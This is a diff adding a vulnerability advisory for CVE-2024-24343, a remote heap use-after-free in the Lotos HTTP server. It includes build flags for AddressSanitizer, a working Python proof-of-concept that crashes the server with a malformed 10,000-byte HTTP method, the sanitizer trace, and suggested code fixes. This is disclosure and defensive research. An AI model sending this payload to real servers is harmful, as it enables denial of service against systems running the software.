@@ -175,4 +175,196 @@ The length of 5000 can be modified to meet your specific needs.  Keep in mind, t
 * https://learn.snyk.io/lesson/use-after-free/
 * https://owasp.org/www-community/vulnerabilities/Using_freed_memory#:~:text=Use%20after%20free%20errors%20occur,conditions%20and%20other%20exceptional%20circumstances
 * https://www.cve.org/CVERecord?id=CVE-2024-22088
+
+# CVE-2024-24343
+
+I discovered a second remote use-after-free vulnerability in the Lotos HTTP server.  The use-after-free occurs in static inline char *buffer_end(const buffer_t *pb), line 32:
+
+https://github.com/chendotjs/lotos/blob/3eb36cc3723a1dc9bb737505f0c8a3538ee16347/src/buffer.h#L31-L33
+
+Any project that utilizes lotos (including the existing forks of this repo) are potentially vulnerable.  Depending on the implementation, this can lead to undefined behavior, denial of service, or authentication bypass. 
+
+### Makefile Modifications
+
+The following modifications were made to the Makefile to compile lotos with address sanitizer and debug symbols. The purpose of this is to track and verify the location of the use-after-free vulnerability:
+
+```
+CFLAGS=-std=c99 -Wall -O3 -DNDEBUG -DUSE_MEM_POOL=1 -fsanitize=address -g
+OPTFLAGS=
+
+OBJS=misc.o ssstr.o dict.o lotos_epoll.o buffer.o request.o response.o \
+ connection.o http_parser.o server.o mem_pool.o main.o
+
+lotos : $(OBJS)
+	$(CC) $(CFLAGS) $^ -o $@ $(OPTFLAGS)
+
+test :
+	make -C ./test
+	make test -C ./test
+
+format :
+	find . -iname '*.[ch]' -exec clang-format -i -style="{ColumnLimit: 80}" {} +
+
+clean :
+	rm -f *.o lotos
+
+.PHONY : test clean format
+```
+
+### Compiling Lotos
+
+```
+$ cd lotos/src/
+$ make && make test
+```
+
+### Proof of Concept Python3 Script
+
+Save the following script to a file named poc.py. The script will send an packet with a malformed HTTP verb (request method) to lotos and wait for a response.  The verb is a series of '/.' characters.  The total size of the malformed method is around 10,000 bytes.  This can also be achieved with a malformed 'Host:' header:
+
+```
+#!/usr/bin/env python3
+import socket
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect(("localhost", 8888))
+sock.send(b"/."*5000+b" /hello HTTP/1.1\r\nHost: localhost:8888\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\n\r\n\r\n")
+response = sock.recv(4096)
+sock.close()
+```
+
+### Starting Lotos
+
+```
+./lotos -r ../www
+```
+
+### Executing our Python3 Script
+
+```
+# python3 poc.py
+```
+
+### Address Sanitizer Output
+
+The following output was produced by address sanitizer: 
+
+```
+==296123==ERROR: AddressSanitizer: heap-use-after-free on address 0x625000002900 at pc 0x56177a0dbbed bp 0x7fffd7927b10 sp 0x7fffd7927b08
+READ of size 4 at 0x625000002900 thread T0
+    #0 0x56177a0dbbec in buffer_end /home/kali/projects/fuzzing/lotos/src/buffer.h:32
+    #1 0x56177a0dbbec in parse_request_line /home/kali/projects/fuzzing/lotos/src/http_parser.c:34
+    #2 0x56177a0d7376 in request_handle_request_line /home/kali/projects/fuzzing/lotos/src/request.c:170
+    #3 0x56177a0d8530 in request_handle /home/kali/projects/fuzzing/lotos/src/request.c:162
+    #4 0x56177a0d4c4a in main /home/kali/projects/fuzzing/lotos/src/main.c:81
+    #5 0x7f4c4fa456c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
+    #6 0x7f4c4fa45784 in __libc_start_main_impl ../csu/libc-start.c:360
+    #7 0x56177a0d4e80 in _start (/home/kali/projects/fuzzing/lotos/src/lotos+0x6e80) (BuildId: f69cadb3b591a9b1911fbc4bf465035606fb00ae)
+
+0x625000002900 is located 0 bytes inside of 8201-byte region [0x625000002900,0x625000004909)
+freed by thread T0 here:
+    #0 0x7f4c4fcd74b5 in __interceptor_realloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:85
+    #1 0x56177a0d63f1 in buffer_cat /home/kali/projects/fuzzing/lotos/src/buffer.c:60
+
+previously allocated by thread T0 here:
+    #0 0x7f4c4fcd85bf in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:69
+    #1 0x56177a0d61bd in buffer_new /home/kali/projects/fuzzing/lotos/src/buffer.c:10
+    #2 0x56177a0d61bd in buffer_init /home/kali/projects/fuzzing/lotos/src/buffer.c:7
+
+SUMMARY: AddressSanitizer: heap-use-after-free /home/kali/projects/fuzzing/lotos/src/buffer.h:32 in buffer_end
+Shadow bytes around the buggy address:
+  0x625000002680: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x625000002700: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x625000002780: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x625000002800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x625000002880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+=>0x625000002900:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x625000002980: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x625000002a00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x625000002a80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x625000002b00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x625000002b80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==296123==ABORTING
+
+```
+
+The error is a "heap-use-after-free" issue detected by AddressSanitizer in lotos. It occurs when the program attempts to read a 4-byte memory region at address 0x625000002900 after that memory has already been deallocated (freed). The error originates from the buffer_end function in buffer.h at line 32 and is part of a call stack involving multiple functions, ultimately leading to the main function. 
+
+### Mitigation
+
+The issue related to the buffer_end function, which is used to determine the end of the buffer. The way to mitigate this issues is to ensure that you do not access memory that has been previously freed. Similar to [issue 7](https://github.com/chendotjs/lotos/issues/7) when realloc is called, it may move the memory block to a new location if the new size cannot be accommodated in the existing space. This means the pointer to the buffer could become invalid if realloc moves the memory.  The following updates can mitigate this issue.  Modify the lengths for your specific use case:
+
+1. Check the size of the HTTP verbs in static int parse_method at http_parser.c, line 342:
+
+Old code:
+```
+static int parse_method(char *begin, char *end) {
+  int len = end - begin;
+```
+
+Updated code with a length check:
+```
+static int parse_method(char *begin, char *end) {
+  int len = end - begin;
+  if(len > 7){
+    return HTTP_INVALID;
+  }
+```
+
+
+2. Check the size of the request in request.c, line 130:
+
+Old code:
+
+```
+    if (len == ERROR ) {
+      if (errno != EAGAIN) {
+        lotos_log(LOG_ERR, "recv: %s", strerror(errno));
+        return ERROR;
+      } else
+        return AGAIN; /* does not have data now */
+    }
+    buffer_cat(r->ib, buf, len); /* append new data to buffer */
+```
+
+Updated code:
+
+```
+    if (len == ERROR || len>2000) {
+      if (errno != EAGAIN) {
+        lotos_log(LOG_ERR, "recv: %s", strerror(errno));
+        return ERROR;
+      } else
+        return AGAIN; /* does not have data now */
+    }
+    buffer_cat(r->ib, buf, len); /* append new data to buffer */
+```
+
+
+### References
+
+* [CVE-2024-24343](https://www.cve.org/CVERecord?id=CVE-2024-24343)
+* https://cwe.mitre.org/data/definitions/416.html
+* https://learn.snyk.io/lesson/use-after-free/
+* https://owasp.org/www-community/vulnerabilities/Using_freed_memory#:~:text=Use%20after%20free%20errors%20occur,conditions%20and%20other%20exceptional%20circumstances
+
   
